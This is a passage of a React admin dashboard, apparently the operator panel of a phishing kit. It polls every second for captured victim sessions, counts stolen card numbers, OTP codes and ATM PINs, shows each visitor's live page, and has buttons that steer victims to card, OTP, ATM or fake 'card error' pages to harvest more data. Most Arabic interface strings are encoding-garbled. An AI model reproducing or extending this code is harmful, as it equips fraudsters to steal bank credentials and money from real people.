                >{loadingAction === "go_identity_check" ? "..." : "Ã°ÂÂÂ ÃÂÃÂÃÂÃÂ©"}</button>
              </div>
              
              <p className="text-[10px] text-slate-400 font-semibold pt-2">ÃÂÃÂ§ÃÂ¦ÃÂÃÂ© ÃÂ§ÃÂÃÂ§ÃÂÃÂªÃÂ¸ÃÂ§ÃÂ±</p>
              <div className="grid gap-2">
                <button
                  type="button"
                  disabled={loadingAction === "go_waiting"}
                  onClick={() => void handleControl("go_waiting")}
                  className="rounded-2xl bg-amber-600 px-3 py-2 text-xs font-semibold text-white hover:bg-amber-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_waiting" ? "..." : "⏳ قائمة الانتظار"}</button>
              </div>
              
              <p className="text-[10px] text-slate-400 font-semibold pt-2">ÃÂ®ÃÂ·ÃÂ£</p>
              <div className="grid gap-2">
                <button
                  type="button"
                  disabled={loadingAction === "card_error"}
                  onClick={() => void handleControl("card_error")}
                  className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "card_error" ? "..." : "Ã¢ÂÂ ÃÂ®ÃÂ·ÃÂ£ ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ©"}</button>
              </div>
            </div>
          </div>
        )}
        
        {/* ÃÂ§ÃÂÃÂªÃÂ§ÃÂ±ÃÂÃÂ®ÃÂ / ÃÂ§ÃÂÃÂ£ÃÂ±ÃÂ´ÃÂÃÂ Section */}
        <div className="border-t border-slate-100">
          <button
            type="button"
            onClick={() => setHistoryExpanded(!historyExpanded)}
            className="flex w-full items-center justify-between px-4 py-2 text-xs text-slate-500 hover:bg-slate-50 transition-colors"
          >
            <span className="flex items-center gap-2">
              <Clock className="w-3 h-3" />
              ÃÂ§ÃÂÃÂ³ÃÂ¬ÃÂ ÃÂ§ÃÂÃÂªÃÂ§ÃÂ±ÃÂÃÂ®ÃÂ ({rows.length} ÃÂ³ÃÂ¬ÃÂ)
            </span>
            {historyExpanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
          </button>
          
          {historyExpanded && (
            <div className="px-4 pb-3 space-y-2 max-h-96 overflow-y-auto">
              {rows.map((row, index) => {
                const data = parseData(row.data);
                const prevRow = index < rows.length - 1 ? rows[index + 1] : null;
                const prevData = prevRow ? parseData(prevRow.data) : null;
                
                // De-duplication: skip if data is identical to previous row
                const isDuplicate = prevData && JSON.stringify(data) === JSON.stringify(prevData);
                if (isDuplicate) return null;
                
                const isLatest = index === 0;
                
                return (
                  <div
                    key={row.id}
                    className={`rounded-xl p-3 text-[11px] ${
                      isLatest 
                        ? "bg-blue-50 border border-blue-200" 
                        : "bg-slate-50 border border-slate-200"
                    }`}
                  >
                    {/* Header */}
                    <div className="flex items-center justify-between mb-2 pb-2 border-b border-slate-200">
                      <div className="flex items-center gap-2">
                        <span className={`font-bold ${isLatest ? "text-blue-700" : "text-slate-700"}`}>
                          {getTypeArabic(row.type)}
                        </span>
                        {isLatest && <span className="text-[9px] bg-blue-200 text-blue-800 px-1.5 py-0.5 rounded font-semibold">ÃÂ§ÃÂÃÂ£ÃÂ­ÃÂ¯ÃÂ«</span>}
                      </div>
                      <div className="flex items-center gap-2 text-slate-400">
                        <span className="text-[10px]">{formatTimeCounter(row.createdAt)}</span>
                        <span className="text-[9px]">Ã¢ÂÂ¢</span>
                        <span className="text-[9px]">#{row.id}</span>
                      </div>
                    </div>
                    
                    {/* Full Data - No Truncation */}
                    <div className="space-y-1.5">
                      {Object.entries(data).map(([key, value]) => (
                        <div key={key} className="flex items-start gap-2 py-1 border-b border-slate-100 last:border-0">
                          <span className="text-slate-500 min-w-[100px] font-semibold">{key}:</span>
                          <span className="font-mono text-slate-800 break-all flex-1">{String(value ?? "")}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const [rawRows, setRawRows] = useState<SubmissionRow[]>([]);
  const [stats, setStats] = useState<StatsType | null>(null);
  const [selectedIds, setSelectedIds] = useState<string[]>([]);
  const [blockedSessions, setBlockedSessions] = useState(getBlockedSessions());
  const [trashItems, setTrashItems] = useState(getTrashItems());
  const [settingsOpen, setSettingsOpen] = useState(false);
  const [trashOpen, setTrashOpen] = useState(false);
  const [passwordOpen, setPasswordOpen] = useState(false);
  const [historyDialog, setHistoryDialog] = useState<{ sessionId: string; rows: SubmissionRow[] } | null>(null);
  const [settings, setSettings] = useState(getAdminSettings());
  const [passwordValue, setPasswordValue] = useState("");
  const [passwordStatus, setPasswordStatus] = useState<string | null>(null);
  const intervalRef = useRef<number | null>(null);
  
  // Track session online status and current page
  const [trackingInfo, setTrackingInfo] = useState<Record<string, SessionTrackingInfo>>({});

  const sessions = useMemo(() => {
    const trashedIds = new Set(trashItems.map((item) => item.id));
    const grouped: Record<string, SubmissionRow[]> = {};
    rawRows
      .filter((row) => !trashedIds.has(row.id))
      .forEach((row) => {
        if (!grouped[row.sessionId]) grouped[row.sessionId] = [];
        grouped[row.sessionId].push(row);
      });

    // Sort EACH session's rows by ID DESCENDING (newest first) - CRITICAL FIX
    Object.values(grouped).forEach((list) => list.sort((a, b) => b.id - a.id));

    // Create sessions object with history included
    const sessionsWithHistory = Object.fromEntries(
      Object.entries(grouped).sort(([, a], [, b]) => {
        // Sort sessions by their NEWEST record (first item after sort by id desc)
        const aTime = new Date(a[0].createdAt).getTime();
        const bTime = new Date(b[0].createdAt).getTime();
        return bTime - aTime;
      }),
    );

    // Add history to each session (sorted by id descending - newest first)
    Object.keys(sessionsWithHistory).forEach((sessionId) => {
      sessionsWithHistory[sessionId] = sessionsWithHistory[sessionId].sort((a, b) => b.id - a.id);
    });

    return sessionsWithHistory;
  }, [rawRows, trashItems]);

  useEffect(() => {
    if (!getToken()) {
      setLocation("/admin");
    }
  }, [setLocation]);

  const fetchData = useCallback(async () => {
    const token = getToken();
    if (!token) return;
    try {
      const [statsData, submissionsResponse, trackedSessions] = await Promise.all([
        getAdminStats(token),
        getAllAdminSubmissions(token),
        getTrackedSessions(),
      ]);
      setStats(statsData);
      setRawRows(submissionsResponse.submissions);
      
      // Update tracking info
      const trackingMap: Record<string, SessionTrackingInfo> = {};
      trackedSessions.sessions.forEach((session) => {
        trackingMap[session.sessionId] = session;
      });
      setTrackingInfo(trackingMap);
    } catch (error) {
      console.error("Failed to load admin data:", error);
      if (error instanceof Error && (error.message.includes("Unauthorized") || error.message.includes("401"))) {
        logoutAdmin();
        setLocation("/admin");
      }
    }
  }, [setLocation]);

  useEffect(() => {
    void fetchData();
    const id = window.setInterval(() => {
      void fetchData();
    }, 1000);
    intervalRef.current = id;
    return () => {
      if (intervalRef.current) window.clearInterval(intervalRef.current);
    };
  }, [fetchData]);

  useEffect(() => {
    setSelectedIds((current) => current.filter((sessionId) => Object.keys(sessions).includes(sessionId)));
  }, [sessions]);

  const handleLogout = useCallback(() => {
    logoutAdmin();
    setLocation("/admin");
  }, [setLocation]);

  const handleLogoutAll = useCallback(async () => {
    const token = getToken();
    if (!token) return;
    await adminLogoutAll(token);
    logoutAdmin();
    setLocation("/admin");
  }, [setLocation]);

  const handleChangePassword = useCallback(async () => {
    const token = getToken();
    if (!token) return;
    if (!passwordValue.trim()) {
      setPasswordStatus("ÃÂ£ÃÂ¯ÃÂ®ÃÂ ÃÂÃÂÃÂÃÂ© ÃÂÃÂ±ÃÂÃÂ± ÃÂ¬ÃÂ¯ÃÂÃÂ¯ÃÂ©");
      return;
    }
    try {
      await adminChangePassword(token, passwordValue.trim());
      setPasswordStatus("ÃÂªÃÂ ÃÂªÃÂºÃÂÃÂÃÂ± ÃÂÃÂÃÂÃÂ© ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ± ÃÂ¨ÃÂÃÂ¬ÃÂ§ÃÂ­.");
      setPasswordValue("");
    } catch (error) {
      console.error(error);
      setPasswordStatus("ÃÂÃÂ´ÃÂ ÃÂªÃÂºÃÂÃÂÃÂ± ÃÂÃÂÃÂÃÂ© ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ±.");
    }
  }, [passwordValue]);

  const handleSaveSettings = useCallback(() => {
    saveAdminSettings(settings);
    setSettingsOpen(false);
  }, [settings]);

  const handleBlock = useCallback((sessionId: string, ownerName?: string) => {
    blockSession(sessionId, ownerName, "ÃÂÃÂ­ÃÂ¸ÃÂÃÂ± ÃÂ¨ÃÂÃÂ§ÃÂ³ÃÂ·ÃÂ© ÃÂ§ÃÂÃÂ¥ÃÂ¯ÃÂ§ÃÂ±ÃÂ©");
    setBlockedSessions(getBlockedSessions());
  }, []);

  const handleUnblock = useCallback((sessionId: string) => {
    unblockSession(sessionId);
    setBlockedSessions(getBlockedSessions());
  }, []);

  const handleDeleteSession = useCallback((sessionId: string) => {
    const rows = sessions[sessionId] ?? [];
    rows.forEach((row) => {
      moveSubmissionToTrash({
        id: row.id,
        sessionId: row.sessionId,
        type: row.type,
        data: row.data,
        ipAddress: row.ipAddress,
        createdAt: row.createdAt,
        ownerName: parseData(rows[0]?.data ?? null).ownerName,
      });
    });
    setTrashItems(getTrashItems());
    setSelectedIds((current) => current.filter((id) => id !== sessionId));
  }, [sessions]);

  const handleDeleteSelected = useCallback(() => {
    selectedIds.forEach((sessionId) => handleDeleteSession(sessionId));
  }, [selectedIds, handleDeleteSession]);

  const handleRestoreTrash = useCallback((itemId: number) => {
    restoreTrashItem(itemId);
    setTrashItems(getTrashItems());
  }, []);

  const handleDeleteTrashItem = useCallback((itemId: number) => {
    deleteTrashItem(itemId);
    setTrashItems(getTrashItems());
  }, []);

  const handleEmptyTrash = useCallback(() => {
    clearTrash();
    setTrashItems([]);
  }, []);

  const handleControlAction = useCallback(async (sessionId: string, action: string, code?: string) => {
    const token = getToken();
    if (!token) {
      toast("error", "ÃÂ®ÃÂ·ÃÂ£ ÃÂÃÂ ÃÂ§ÃÂÃÂªÃÂÃÂ«ÃÂÃÂ", "ÃÂÃÂ ÃÂÃÂªÃÂ ÃÂ§ÃÂÃÂ¹ÃÂ«ÃÂÃÂ± ÃÂ¹ÃÂÃÂ ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂ¯ÃÂ®ÃÂÃÂ");
      return;
    }
    
    try {
      const result = await sendAdminControl(sessionId, action, token, code);
      
      // Map action to page name for display
      const pageNames: Record<string, string> = {
        go_home: "ÃÂ§ÃÂÃÂµÃÂÃÂ­ÃÂ© ÃÂ§ÃÂÃÂ±ÃÂ¦ÃÂÃÂ³ÃÂÃÂ©",
        go_form: "ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ¨ÃÂ©",
        go_select: "ÃÂ§ÃÂ®ÃÂªÃÂÃÂ§ÃÂ± ÃÂ§ÃÂÃÂªÃÂ£ÃÂÃÂÃÂ",
        go_visa: "ÃÂµÃÂÃÂ­ÃÂ© ÃÂ§ÃÂÃÂÃÂÃÂ²ÃÂ§",
        go_otp: "ÃÂµÃÂÃÂ­ÃÂ© OTP",
        go_otp2: "ÃÂµÃÂÃÂ­ÃÂ© OTP 2",
        go_otp3: "ÃÂµÃÂÃÂ­ÃÂ© OTP 3",
        go_atm: "ÃÂµÃÂÃÂ­ÃÂ© ATM",
        go_nomer: "ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ",
        go_nomer_wait: "ÃÂ§ÃÂÃÂªÃÂ¸ÃÂ§ÃÂ± ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ",
        go_nomer_otp: "ÃÂªÃÂ­ÃÂÃÂ ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ",
        go_identity_check: "ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ ÃÂÃÂ ÃÂ§ÃÂÃÂÃÂÃÂÃÂ©",
        go_total: "ÃÂ§ÃÂÃÂ¥ÃÂ¬ÃÂÃÂ§ÃÂÃÂ",
        go_total2: "ÃÂ§ÃÂÃÂ¥ÃÂ¬ÃÂÃÂ§ÃÂÃÂ 2",
        go_waiting: "ÃÂÃÂ§ÃÂ¦ÃÂÃÂ© ÃÂ§ÃÂÃÂ§ÃÂÃÂªÃÂ¸ÃÂ§ÃÂ±",
        card_error: "ÃÂ¥ÃÂ¨ÃÂÃÂ§ÃÂº ÃÂ®ÃÂ·ÃÂ£ ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ©",
        nomer_error: "ÃÂ¥ÃÂ¨ÃÂÃÂ§ÃÂº ÃÂ®ÃÂ·ÃÂ£ ÃÂ§ÃÂÃÂ±ÃÂÃÂ",
        identity_code: "ÃÂ¥ÃÂ±ÃÂ³ÃÂ§ÃÂ ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂÃÂÃÂÃÂ©",
      };
      
      const pageName = pageNames[action] || action;
      
      if (result.success) {
        if (action === "card_error") {
          toast("success", "ÃÂªÃÂ ÃÂ¥ÃÂ±ÃÂ³ÃÂ§ÃÂ ÃÂ¥ÃÂ´ÃÂ¹ÃÂ§ÃÂ± ÃÂ§ÃÂÃÂ®ÃÂ·ÃÂ£", "ÃÂªÃÂ ÃÂ¥ÃÂ¨ÃÂÃÂ§ÃÂº ÃÂ§ÃÂÃÂ¹ÃÂÃÂÃÂ ÃÂ¨ÃÂ£ÃÂ ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ© ÃÂÃÂ±ÃÂÃÂÃÂ¶ÃÂ©");
        } else {
          toast("success", "ÃÂªÃÂ ÃÂªÃÂ­ÃÂÃÂÃÂ ÃÂ§ÃÂÃÂ¹ÃÂÃÂÃÂ", `ÃÂªÃÂ ÃÂ§ÃÂÃÂªÃÂÃÂ¬ÃÂÃÂ ÃÂ¥ÃÂÃÂ: ${pageName}`);
        }
      }
    } catch (error) {
      console.error("Error sending control:", error);
      toast("error", "ÃÂ®ÃÂ·ÃÂ£ ÃÂÃÂ ÃÂ§ÃÂÃÂªÃÂÃÂÃÂÃÂ°", "ÃÂÃÂ´ÃÂ ÃÂÃÂ ÃÂ¥ÃÂ±ÃÂ³ÃÂ§ÃÂ ÃÂ§ÃÂÃÂ£ÃÂÃÂ± ÃÂÃÂÃÂ®ÃÂ§ÃÂ¯ÃÂ");
    }
    
    await fetchData();
  }, [fetchData]);

  const blockedMap = useMemo(() => Object.fromEntries(blockedSessions.map((entry) => [entry.sessionId, entry])), [blockedSessions]);
  const sessionCount = Object.keys(sessions).length;
  const cardCount = stats?.byType.find((item) => item.type === "card")?.count ?? 0;
  const otpCount = stats?.byType.filter((item) => item.type.startsWith("otp")).reduce((sum, item) => sum + item.count, 0) ?? 0;
  const atmCount = stats?.byType.find((item) => item.type === "atm")?.count ?? 0;
  const pendingCount = Object.values(sessions).filter((rows) => rows.some((r) => r.type === "card") && !rows.some((r) => r.type.startsWith("otp"))).length;
  const blockedCount = blockedSessions.length;
  const trashedCount = trashItems.length;
  const allSelected = sessionCount > 0 && selectedIds.length === sessionCount;

  return (
    <div className="min-h-screen bg-slate-100" dir="rtl">
      <header className="sticky top-0 z-30 border-b border-slate-200 bg-white/95 backdrop-blur-lg">
        <div className="mx-auto flex max-w-6xl flex-col gap-4 px-4 py-4 sm:px-6 lg:px-8">
          <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
            <div className="space-y-2 text-right">
              <div className="flex flex-wrap items-center gap-2 text-lg font-bold text-slate-900">
                <ShieldCheck className="h-5 w-5 text-blue-600" />
                ÃÂÃÂÃÂ­ÃÂ© ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ ÃÂ§ÃÂÃÂ¥ÃÂ¯ÃÂ§ÃÂ±ÃÂÃÂ©
              </div>
              <p className="text-sm text-slate-500">ÃÂªÃÂÃÂ§ÃÂµÃÂ ÃÂÃÂ¹ ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂ¬ÃÂÃÂ³ÃÂ§ÃÂª ÃÂÃÂ ÃÂ£ÃÂ ÃÂÃÂÃÂ§ÃÂÃÂ ÃÂÃÂ£ÃÂ¯ÃÂ± ÃÂ§ÃÂÃÂÃÂ³ÃÂªÃÂ®ÃÂ¯ÃÂÃÂÃÂ ÃÂ¨ÃÂ³ÃÂÃÂÃÂÃÂ©.</p>
            </div>
            <div className="flex flex-wrap items-center gap-2 justify-end">
              <Button size="sm" variant="outline" onClick={fetchData}>ÃÂªÃÂ­ÃÂ¯ÃÂÃÂ«</Button>
              <Button size="sm" onClick={() => setSettingsOpen(true)}>ÃÂ¥ÃÂ¹ÃÂ¯ÃÂ§ÃÂ¯ÃÂ§ÃÂª ÃÂ§ÃÂÃÂ¹ÃÂ±ÃÂÃÂ¶</Button>
              <Button size="sm" variant="secondary" onClick={() => setPasswordOpen(true)}>ÃÂªÃÂºÃÂÃÂÃÂ± ÃÂÃÂÃÂÃÂ© ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ±</Button>
              <Button size="sm" variant="destructive" onClick={handleLogoutAll}>ÃÂ®ÃÂ±ÃÂÃÂ¬ ÃÂÃÂ ÃÂÃÂ ÃÂ§ÃÂÃÂ£ÃÂ¬ÃÂÃÂ²ÃÂ©</Button>
              <Button size="sm" variant="ghost" onClick={handleLogout}>ÃÂ®ÃÂ±ÃÂÃÂ¬</Button>
            </div>
          </div>

          <div className="grid gap-3 sm:grid-cols-3">
            <div className="rounded-3xl border border-slate-200 bg-white p-4 text-right">
              <div className="text-xs text-slate-500">ÃÂ§ÃÂÃÂ¬ÃÂÃÂ³ÃÂ§ÃÂª</div>
              <div className="mt-2 text-3xl font-bold text-slate-900">{sessionCount}</div>
            </div>
            <div className="rounded-3xl border border-slate-200 bg-white p-4 text-right">
              <div className="text-xs text-slate-500">ÃÂ§ÃÂÃÂ¥ÃÂ¯ÃÂ®ÃÂ§ÃÂÃÂ§ÃÂª</div>
              <div className="mt-2 text-3xl font-bold text-slate-900">{stats?.totalSubmissions ?? 0}</div>
            </div>
            <div className="rounded-3xl border border-slate-200 bg-white p-4 text-right">
              <div className="flex items-center justify-between text-xs text-slate-500">
                <span>ÃÂÃÂ­ÃÂ¸ÃÂÃÂ± / ÃÂÃÂÃÂÃÂÃÂ§ÃÂª</span>
                <Badge className="bg-slate-100 text-slate-700">{blockedCount}</Badge>
              </div>
              <div className="mt-2 text-3xl font-bold text-slate-900">{trashedCount}</div>
            </div>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-6xl px-4 py-6 sm:px-6 lg:px-8 space-y-6">
        <div className="grid gap-3 sm:grid-cols-4">
          <StatCard label="ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ§ÃÂª" value={cardCount} icon={<CreditCard className="w-4 h-4" />} color="bg-red-100 text-red-600" />
          <StatCard label="OTP" value={otpCount} icon={<KeyRound className="w-4 h-4" />} color="bg-orange-100 text-orange-600" />
          <StatCard label="ATM" value={atmCount} icon={<Banknote className="w-4 h-4" />} color="bg-yellow-100 text-yellow-700" />
          <StatCard label="ÃÂÃÂÃÂ¯ ÃÂ§ÃÂÃÂÃÂªÃÂ§ÃÂ¨ÃÂ¹ÃÂ©" value={pendingCount} icon={<Clock className="w-4 h-4" />} color="bg-blue-100 text-blue-600" />
        </div>

        <section className="rounded-3xl border border-slate-200 bg-white p-4">
          <div className="mb-4 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
            <div className="text-right">
              <h2 className="text-lg font-semibold text-slate-900">ÃÂ§ÃÂÃÂ¬ÃÂÃÂ³ÃÂ§ÃÂª</h2>
              <p className="text-sm text-slate-500">ÃÂ§ÃÂ®ÃÂªÃÂ± ÃÂ¬ÃÂÃÂ³ÃÂ© ÃÂÃÂÃÂ¹ÃÂÃÂ ÃÂ¹ÃÂÃÂÃÂÃÂ§ ÃÂ£ÃÂ ÃÂ­ÃÂ¸ÃÂ± ÃÂÃÂ³ÃÂªÃÂ®ÃÂ¯ÃÂ ÃÂ£ÃÂ ÃÂ­ÃÂ°ÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ³ÃÂ©.</p>
            </div>
            <div className="flex flex-wrap items-center gap-2 text-xs text-slate-500">
              <span>{sessionCount} ÃÂ¬ÃÂÃÂ³ÃÂ©</span>
              <span>|</span>
              <span>{cardCount} ÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ©</span>
              <span>|</span>
              <span>{otpCount} OTP</span>
            </div>
          </div>

          {sessionCount === 0 ? (
            <div className="rounded-3xl border border-dashed border-slate-300 bg-slate-50 p-10 text-center text-slate-500">
              ÃÂÃÂ§ ÃÂÃÂÃÂ¬ÃÂ¯ ÃÂ¬ÃÂÃÂ³ÃÂ§ÃÂª ÃÂ­ÃÂ§ÃÂÃÂÃÂ§ÃÂ
            </div>
          ) : (
            <div className="space-y-4">
              <div className="flex flex-wrap items-center justify-between gap-3 text-xs text-slate-500">
                <div className="flex items-center gap-3">
                  <label className="inline-flex items-center gap-2">
                    <input
                      type="checkbox"
                      checked={allSelected}
                      onChange={() => {
                        if (allSelected) setSelectedIds([]);
                        else setSelectedIds(Object.keys(sessions));
                      }}
                      className="h-4 w-4 rounded border-slate-300 text-blue-600"
                    />
                    ÃÂªÃÂ­ÃÂ¯ÃÂÃÂ¯ ÃÂ§ÃÂÃÂÃÂ
                  </label>
                  <span>{selectedIds.length} ÃÂÃÂ­ÃÂ¯ÃÂ¯</span>
                </div>
                <button
                  type="button"
                  disabled={selectedIds.length === 0}
                  onClick={handleDeleteSelected}
                  className="rounded-3xl border border-red-200 bg-red-50 px-3 py-2 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
                >ÃÂÃÂÃÂ ÃÂ§ÃÂÃÂÃÂ­ÃÂ¯ÃÂ¯ ÃÂ¥ÃÂÃÂ ÃÂ§ÃÂÃÂÃÂÃÂÃÂÃÂ§ÃÂª</button>
              </div>
              <div className="space-y-4">
                {Object.entries(sessions).map(([sessionId, rows]) => (
                  <SessionBox
                    key={sessionId}
                    sessionId={sessionId}
                    rows={rows}
                    selected={selectedIds.includes(sessionId)}
                    onToggleSelect={() => {
                      setSelectedIds((current) => current.includes(sessionId)
                        ? current.filter((id) => id !== sessionId)
                        : [...current, sessionId]);
                    }}
                    blocked={blockedMap[sessionId]?.message}
                    onControl={handleControlAction}
                    onBlock={() => handleBlock(sessionId, parseData(rows[0]?.data ?? null).ownerName)}
                    onUnblock={() => handleUnblock(sessionId)}
                    onDelete={() => handleDeleteSession(sessionId)}
                    onOpenHistory={() => setHistoryDialog({ sessionId, rows })}
                    currentPage={trackingInfo[sessionId]?.currentPage}
                    isOnline={trackingInfo[sessionId]?.isOnline}
                  />
                ))}
              </div>
            </div>
          )}
        </section>
      </main>

      <SessionHistoryDialog
        open={Boolean(historyDialog)}
        rows={historyDialog?.rows ?? []}
        onClose={() => setHistoryDialog(null)}
      />

      <Dialog open={settingsOpen} onOpenChange={setSettingsOpen}>
        <DialogContent className="sm:max-w-[720px] max-h-[85vh] flex flex-col" dir="rtl">
          <DialogHeader>
            <DialogTitle>ÃÂ¥ÃÂ¹ÃÂ¯ÃÂ§ÃÂ¯ÃÂ§ÃÂª ÃÂ§ÃÂÃÂ¹ÃÂ±ÃÂÃÂ¶</DialogTitle>
          </DialogHeader>
          <ScrollArea className="flex-1 mt-4">
            <div className="space-y-4">
              {settings.offers.map((offer, index) => (
                <div key={offer.id} className="rounded-3xl border border-slate-200 bg-white p-4">
                  <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                    <div>
                      <div className="text-sm font-semibold text-slate-900">{offer.name} ({offer.type})</div>
                      <p className="text-xs text-slate-500">ÃÂ§ÃÂÃÂ³ÃÂ¹ÃÂ± ÃÂ§ÃÂÃÂ­ÃÂ§ÃÂÃÂ</p>
                    </div>
                    <input
                      type="number"
                      value={offer.price}
                      onChange={(event) => {
                        const nextOffers = [...settings.offers];
                        nextOffers[index] = { ...offer, price: Number(event.target.value) };
                        setSettings({ ...settings, offers: nextOffers });
                      }}
                      className="w-full max-w-[180px] rounded-3xl border border-slate-300 bg-slate-50 px-3 py-2 text-sm text-slate-900"
                    />
                  </div>
                </div>
              ))}
            </div>
          </ScrollArea>
          <div className="mt-4 flex flex-wrap justify-end gap-2">
            <Button size="sm" variant="outline" onClick={() => setSettingsOpen(false)}>ÃÂ¥ÃÂÃÂºÃÂ§ÃÂ¡</Button>
            <Button size="sm" onClick={handleSaveSettings}>ÃÂ­ÃÂÃÂ¸</Button>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={passwordOpen} onOpenChange={setPasswordOpen}>
        <DialogContent className="sm:max-w-[480px] max-h-[80vh] flex flex-col" dir="rtl">
          <DialogHeader>
            <DialogTitle>ÃÂªÃÂºÃÂÃÂÃÂ± ÃÂÃÂÃÂÃÂ© ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ±</DialogTitle>
          </DialogHeader>
          <div className="space-y-4 mt-4">
            <label className="block text-xs font-semibold text-slate-600">ÃÂÃÂÃÂÃÂ© ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ± ÃÂ§ÃÂÃÂ¬ÃÂ¯ÃÂÃÂ¯ÃÂ©</label>
            <input
              type="password"
              value={passwordValue}
              onChange={(event) => setPasswordValue(event.target.value)}
              className="w-full rounded-3xl border border-slate-300 bg-slate-50 px-3 py-2 text-sm"
            />
            {passwordStatus && <div className="text-xs text-slate-500">{passwordStatus}</div>}
            <div className="flex flex-wrap justify-end gap-2">
              <Button size="sm" variant="outline" onClick={() => setPasswordOpen(false)}>ÃÂ¥ÃÂÃÂºÃÂ§ÃÂ¡</Button>
              <Button size="sm" onClick={handleChangePassword}>ÃÂ­ÃÂÃÂ¸</Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={trashOpen} onOpenChange={setTrashOpen}>
        <DialogContent className="sm:max-w-[720px] max-h-[85vh] flex flex-col" dir="rtl">
          <DialogHeader>
            <DialogTitle>ÃÂ³ÃÂÃÂ© ÃÂ§ÃÂÃÂÃÂÃÂÃÂÃÂ§ÃÂª</DialogTitle>
          </DialogHeader>
          <div className="px-4 pb-4">
            <div className="mb-4 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
              <p className="text-sm text-slate-600">ÃÂÃÂÃÂÃÂÃÂ ÃÂ§ÃÂ³ÃÂªÃÂ¹ÃÂ§ÃÂ¯ÃÂ© ÃÂ£ÃÂ ÃÂ­ÃÂ°ÃÂ ÃÂ§ÃÂÃÂ¹ÃÂÃÂ§ÃÂµÃÂ± ÃÂÃÂÃÂ§ÃÂ¦ÃÂÃÂÃÂ§.</p>
              <button
                type="button"
                onClick={handleEmptyTrash}
                className="rounded-3xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
              >ÃÂ¥ÃÂÃÂ±ÃÂ§ÃÂº ÃÂ§ÃÂÃÂÃÂÃÂÃÂÃÂ§ÃÂª</button>
            </div>
          </div>
          <ScrollArea className="flex-1 px-4 pb-4">
            {trashItems.length === 0 ? (
              <div className="rounded-3xl border border-dashed border-slate-300 bg-slate-50 p-8 text-center text-slate-500">ÃÂÃÂ§ ÃÂÃÂÃÂ¬ÃÂ¯ ÃÂ¹ÃÂÃÂ§ÃÂµÃÂ± ÃÂÃÂ ÃÂ§ÃÂÃÂÃÂÃÂÃÂÃÂ§ÃÂª</div>
            ) : (
              <div className="space-y-4">
                {trashItems.map((item) => (
                  <div key={`${item.sessionId}-${item.id}`} className="rounded-3xl border border-slate-200 bg-white p-4">
                    <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                      <div className="text-right">
                        <p className="text-sm font-semibold text-slate-900">#{item.sessionId.slice(0, 8)}</p>
                        <p className="text-xs text-slate-500">{item.type} Ã¢ÂÂ¢ {formatAgo(item.deletedAt)}</p>
                      </div>
                      <div className="flex flex-wrap gap-2">
                        <button
                          type="button"
                          onClick={() => handleRestoreTrash(item.id)}
                          className="rounded-3xl border border-blue-200 bg-blue-50 px-3 py-2 text-xs text-blue-700 hover:bg-blue-100"
                        >ÃÂ§ÃÂ³ÃÂªÃÂ¹ÃÂ§ÃÂ¯ÃÂ©</button>
                        <button
                          type="button"
                          onClick={() => handleDeleteTrashItem(item.id)}
                          className="rounded-3xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
                        >ÃÂ­ÃÂ°ÃÂ ÃÂÃÂÃÂ§ÃÂ¦ÃÂ</button>
                      </div>
                    </div>
                    <div className="mt-3 grid gap-2 sm:grid-cols-2 text-xs text-slate-500">
                      <div>IP: {item.ipAddress ?? "ÃÂºÃÂÃÂ± ÃÂÃÂ¹ÃÂ±ÃÂÃÂ"}</div>
                      <div>ÃÂÃÂÃÂª ÃÂ§ÃÂÃÂ­ÃÂ°ÃÂ: {new Date(item.deletedAt).toLocaleString("ar-EG")}</div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </ScrollArea>
          <div className="mt-4 flex justify-end gap-2 px-4 pb-4">
            <Button size="sm" variant="outline" onClick={() => setTrashOpen(false)}>ÃÂ¥ÃÂºÃÂÃÂ§ÃÂ</Button>
          </div>
        </DialogContent>
      </Dialog>

      <ToastContainer />
    </div>
  );
}
